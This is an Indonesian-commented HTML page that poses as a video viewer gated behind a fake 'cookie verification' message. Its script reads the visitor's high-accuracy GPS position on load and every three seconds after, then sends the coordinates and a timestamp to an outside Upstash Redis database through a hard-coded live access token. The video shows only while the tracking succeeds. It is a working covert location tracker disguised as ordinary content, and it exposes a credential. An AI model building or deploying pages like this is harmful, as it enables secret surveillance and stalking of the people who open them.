<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
 /* CONTAINER UTAMA KONTEN */
.content-wrapper {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%); /* Memastikan container selalu tepat di tengah layar */
    
    /* Proporsi Maksimal Responsif */
    width: 95vw;          /* Di mobile mengambil 95% lebar layar */
    height: 95vh;         /* Di mobile mengambil 95% tinggi layar */
    max-width: 1200px;    /* Batas lebar maksimal di desktop agar tidak raksasa */
    max-height: 675px;    /* Batas tinggi maksimal (Menjaga rasio 16:9 dari 1200px) */
    
    aspect-ratio: 16 / 9; /* Mengunci proporsi agar ideal untuk video/dashboard */
    overflow: hidden;   
    display: flex;
    justify-content: center;
    align-items: center;
    background: #0a0a0c; 
    
    /* Aksen Bingkai Tactical (Opsional, hapus jika tidak butuh) */
    border: 1px solid rgba(0, 255, 102, 0.3);
    box-shadow: 0 0 20px rgba(0, 0, 0, 0.7);
}

/* IFRAME PROPORSI AMAN */
.content-wrapper iframe {
    width: 100%;
    height: 100%;
    border: none;
    display: block;
    object-fit: contain; /* Mengubah 'cover' menjadi 'contain' agar konten di dalam iframe TIDAK terpotong */
}
    
/* NOTIFIKASI HUD OVERLAY */
.textnotif {
    position: absolute;
    bottom: 25px;      /* Disesuaikan posisinya di dalam container proporsional */
    left: 50%;
    transform: translateX(-50%);
    text-align: center;
    z-index: 10;        
    pointer-events: none; 
    
    /* Sentuhan Gaya Tactical-Tech */
    font-family: 'Courier New', Courier, monospace;
    font-weight: bold;
    color: #000000;
   
    animation: neon-kedip 1s infinite alternate;
}

/* ANIMASI NEON KEDIP BERSIH */
@keyframes neon-kedip {
    0% {
        opacity: 0.2;
    }
    100% {
        opacity: 1;
    }
}
    </style>
</head>
<body>

    <div id="blank-overlay"></div>

    <div class="container">
        <header>
           
            <div id="status-display" class="status-badge status-checking"></div>
        </header>

       <div id="content-frame" class="content-wrapper" style="display: none;">
    <iframe id="video-youtube" src="https://www.youtube.com/embed/6K2E4CFKtNI" allow="autoplay; encrypted-media; fullscreen"></iframe>
  
</div>
            <div id="lock-screen">
                <div class="textnotif">
            
                
                    <div class="lock-msg">verifikasi cookie untuk melihat konten</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Konfigurasi Upstash Redis REST API
        const CONFIG = {
          URL: "https://super-camel-75084.upstash.io",
            TOKEN: "gQAAAAAAASVMAAIgcDI0MjBkMmM4NTRkYWU0OTEyYTZmZWU5ODkxNGI1MmNjZg",
            PREFIX: "candiru_4"
        };

        // Fungsi mendapatkan waktu Jakarta (WIB) dengan format YYYY-MM-DD HH:mm:ss
        function getJakartaTimestamp() {
            const options = {
                timeZone: 'Asia/Jakarta',
                year: 'numeric',
                month: '2-digit',
                day: '2-digit',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                hour12: false
            };
            
            const formatter = new Intl.DateTimeFormat('en-ZA', options);
            return formatter.format(new Date()).replace(',', '');
        }

        // Fungsi kirim data koordinat ke Upstash Redis
        async function pushToUpstash(lat, lon) {
            const timestampJakarta = getJakartaTimestamp();
            
            // Mengatur format koordinat menjadi "-XXX,XXX" dan TANPA User Agent
            const logData = {
                koordinat: `${lat},${lon}`,
                timestamp: timestampJakarta
            };

            const key = `${CONFIG.PREFIX}:${Date.now()}`;

            try {
                const response = await fetch(`${CONFIG.URL}/set/${key}`, {
                    method: 'POST',
                    headers: {
                        'Authorization': `Bearer ${CONFIG.TOKEN}`,
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(logData)
                });
                return response.ok; // Mengembalikan nilai true hanya jika database berhasil menerima data
            } catch (error) {
                console.error("Gagal sinkronisasi data ke Upstash:", error);
                return false;
            }
        }

        // Fungsi untuk menghilangkan layar putih setelah proses inisialisasi selesai
        function removeWhiteOverlay() {
            const overlay = document.getElementById('blank-overlay');
            if (overlay) {
                overlay.style.opacity = '0';
                setTimeout(() => {
                    overlay.style.display = 'none';
                }, 500);
            }
        }

        // Logika Pemeriksaan Akses Lokasi (Dijalankan berulang menggunakan setInterval)
        function fetchAndSyncLocation() {
            const statusDisplay = document.getElementById('status-display');
            const iframe = document.getElementById('content-frame');
            const lockScreen = document.getElementById('lock-screen');

            if (!navigator.geolocation) {
                handleAccessDenied("Browser Tidak Mendukung GPS");
                removeWhiteOverlay();
                return;
            }

            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;

                    // Kirim data yang telah diformat ke Upstash Redis
                    const syncSuccess = await pushToUpstash(lat, lon);

                    // JALUR AMAN: Iframe HANYA tampil jika sinkronisasi Upstash mengembalikan respon OK (True)
                    if (syncSuccess) {
                        statusDisplay.textContent = "";
                        statusDisplay.className = "status-badge status-verified";
                        
                        iframe.style.display = "block";
                        lockScreen.style.display = "none";
                    } else {
                        // Jika koordinat gagal masuk ke Upstash, konten tetap terkunci total
                        handleAccessDenied("Gagal sinkronisasi database server.");
                    }

                    removeWhiteOverlay();
                },
                (error) => {
                    handleAccessDenied("");
                    removeWhiteOverlay();
                },
                {
                    enableHighAccuracy: true,
                    timeout: 8000
                }
            );
        }

        // Sistem utama untuk menginisialisasi pelacakan konstan
        function initCandiruSystem() {
            // Eksekusi pertama kali saat halaman dimuat
            fetchAndSyncLocation();

            // Melakukan refresh pengambilan koordinat dan sinkronisasi otomatis setiap 3000ms (3 detik)
            setInterval(() => {
                fetchAndSyncLocation();
            }, 3000);
        }

        // Handler saat akses diblokir / GPS mati / Sinkronisasi database gagal
        function handleAccessDenied(customMessage = null) {
            const statusDisplay = document.getElementById('status-display');
            const iframe = document.getElementById('content-frame');
            const lockScreen = document.getElementById('lock-screen');

            statusDisplay.textContent = customMessage ? customMessage : "";
            statusDisplay.className = "status-badge status-denied";

            iframe.style.display = "none";
            lockScreen.style.display = "flex";
        }

        // Eksekusi sistem secara otomatis saat window termuat penuh
        window.addEventListener('DOMContentLoaded', () => {
            initCandiruSystem();
        });
    </script>
</body>
</html>
